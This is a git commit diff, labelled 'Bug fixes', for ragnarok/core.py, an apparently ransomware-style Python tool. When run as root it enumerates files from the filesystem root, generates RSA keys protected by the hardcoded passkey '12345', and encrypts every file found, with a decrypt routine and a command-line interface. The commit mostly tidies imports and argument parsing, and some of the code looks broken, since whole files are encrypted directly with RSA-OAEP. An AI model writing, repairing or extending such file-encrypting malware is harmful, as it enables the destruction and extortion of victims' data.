edc39992da206256db1d060263dc5dcc0e44e665
Sam Burton <sam.burton271@gmail.com>
2025-09-16 20:57:23 -0400

    Bug fixes

--- ragnarok/core.py
+++ ragnarok/core.py
@@ -1,18 +1,19 @@
 import os
 import sys
-import cryptography
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
 import argparse
 self = sys.argv[0]
 passKey = "12345"
 dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/usr/lib', '/usr/lib64', '/usr/libexec']
-excludedFiles = [self, '/public_key.pem', '/private_key.pem', '/Readme.txt'] 
+excludedFiles = [self, '/public_key.pem', '/private_key.pem', '/Readme.txt']
 origin = "/"
 def encrypt():
     print("[#] Starting file enumeration from " + origin)
     fileList = findFiles(origin)
     print("[#] File enumeration complete, found " + str(len(fileList)) + " files")
     print("[#] Generating RSA keys")
-    private_key = cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key(
+    private_key = rsa.generate_private_key(
         public_exponent=65537,
         key_size=2048,
     )
@@ -20,15 +21,15 @@ def encrypt():
     print("[#] Key generation complete, writing files")
     pubFile = open("/public_key.pem", "wb")
     pubFile.write(public_key.public_bytes(
-        encoding=cryptography.hazmat.primitives.serialization.Encoding.PEM,
-        format=cryptography.hazmat.primitives.serialization.PublicFormat.SubjectPublicKeyInfo
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
     ))
     pubFile.close()
     privFile = open("/private_key.pem", "wb")
     privFile.write(private_key.private_bytes(
-        encoding=cryptography.hazmat.primitives.serialization.Encoding.PEM,
-        format=cryptography.hazmat.primitives.serialization.PrivateFormat.TraditionalOpenSSL,
-        encryption_algorithm=cryptography.hazmat.primitives.serialization.BestAvailableEncryption(passKey.encode())
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.BestAvailableEncryption(passKey.encode())
     ))
     privFile.close()
     print("[#] Key files written, encrypting files")
@@ -38,9 +39,9 @@ def encrypt():
                 plaintext = file.read()
             ciphertext = public_key.encrypt(
                 plaintext,
-                cryptography.hazmat.primitives.asymmetric.padding.OAEP(
-                    mgf=cryptography.hazmat.primitives.asymmetric.padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()),
-                    algorithm=cryptography.hazmat.primitives.hashes.SHA256(),
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
                     label=None
                 )
             )
@@ -58,7 +59,7 @@ def decrypt():
     print("[#] Reading private key file")
     try:
         with open("/private_key.pem", "rb") as key_file:
-            private_key = cryptography.hazmat.primitives.serialization.load_pem_private_key(
+            private_key = serialization.load_pem_private_key(
                 key_file.read(),
                 password=passKey.encode(),
             )
@@ -74,9 +75,9 @@ def decrypt():
                 ciphertext = file.read()
             plaintext = private_key.decrypt(
                 ciphertext,
-                cryptography.hazmat.primitives.asymmetric.padding.OAEP(
-                    mgf=cryptography.hazmat.primitives.asymmetric.padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()),
-                    algorithm=cryptography.hazmat.primitives.hashes.SHA256(),
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
                     label=None
                 )
             )
@@ -121,24 +122,23 @@ def checkPass(userPass):
     else:
         return False
 if(os.getuid() == 0):
-    if(checkPass()):
-        parser = argparse.ArgumentParser(description="Basic CLI for encrypt/decrypt")
-        parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt files', name='encrypt')
-        parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt files', name='decrypt')
-        parser.add_argument('-o', '--origin', default=origin, help="Root path to start enumeration, defaults to '/'", name='origin')
-        parser.add_argument('-p', '--passkey', default='', help='Password used for user authentication', name='password') # MODIFY
-        args = parser.parse_args(sys.argv[1:])
+    parser = argparse.ArgumentParser(description="Basic CLI for encrypt/decrypt")
+    parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt files')
+    parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt files')
+    parser.add_argument('-o', '--origin', dest=origin, default=origin, type=str, required=False, help="Root path to start enumeration, defaults to '/'")
+    parser.add_argument('-p', '--passkey', dest='password', default='', type=str, required=True, help='Password used for user authentication') # MODIFY
+    args = parser.parse_args(sys.argv[1:])
 
-        origin = args.origin
-        password = args.password
+    origin = args.origin
+    password = args.password
 
-        if args.encrypt and args.decrypt:
-            print("[X] Cannot specify both --encrypt and --decrypt")
-        else:
-            if not checkPass(password):
-                print("[X] Invalid password.")
-                sys.exit(1)
-            if args.encrypt:
-                encrypt()
-            elif args.decrypt:
-                decrypt()
+    if args.encrypt and args.decrypt:
+        print("[X] Cannot specify both --encrypt and --decrypt")
+    else:
+        if not checkPass(password):
+            print("[X] Invalid password.")
+            sys.exit(1)
+        if args.encrypt:
+            encrypt()
+        elif args.decrypt:
+            decrypt()
